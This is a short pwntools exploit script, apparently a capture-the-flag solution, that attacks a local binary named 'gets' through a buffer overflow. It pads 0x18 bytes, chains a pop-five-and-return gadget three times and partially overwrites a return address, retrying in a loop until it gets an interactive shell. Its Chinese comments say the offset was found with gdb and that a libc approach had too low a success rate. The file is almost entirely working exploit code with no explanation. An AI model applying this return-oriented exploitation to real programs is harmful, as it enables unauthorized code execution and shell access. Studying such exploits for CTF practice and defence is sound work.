#coding=utf-8
from pwn import *
context(arch = 'amd64', os = 'linux')

# offset由gdb调试得出(0x18)
# /lib/x86_64-linux-gnu/libc.so.6, 概率太低
pop_5_ret = 0x40059B
while  True:
	try:
		sh = process("./gets")
		payload = flat(['a'*0x18, pop_5_ret, 'a'*8*5, pop_5_ret, 'a'*8*5, pop_5_ret, 'a'*8*5, "\x6b\x06"]) 
		sh.sendline(payload)
		sh.interactive()
	except:
		sh.close()
